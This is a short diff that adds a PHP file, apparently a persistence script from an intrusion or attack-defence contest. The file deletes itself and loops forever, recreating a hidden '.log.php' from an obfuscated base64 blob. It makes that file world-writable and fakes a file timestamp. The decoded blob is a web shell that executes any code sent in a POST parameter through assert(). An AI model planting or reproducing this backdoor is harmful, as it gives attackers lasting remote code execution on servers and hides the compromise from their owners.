@@ -1,0 +1,13 @@
+<?php
+
+    set_time_limit(0);
+    ignore_user_abort(1);
+    unlink(__FILE__);
+    while(1){
+        file_put_contents('.log.php',base64_decode('PD9waHAgJHA9YmFzZTY0X2RlY29kZSgiZERBd2JITSIpOyRpWydqJ109J2Fzc2VydCc7JGFbXT0kaTtAJGFbMF1bJ2onXSgkX1BPU1RbJHBdKTs'));
+        system('chmod 777 .log.php');
+        touch(".log1.php", mktime(20,15,1,11,17,2017));
+        usleep(100);
+    }
+
+?>
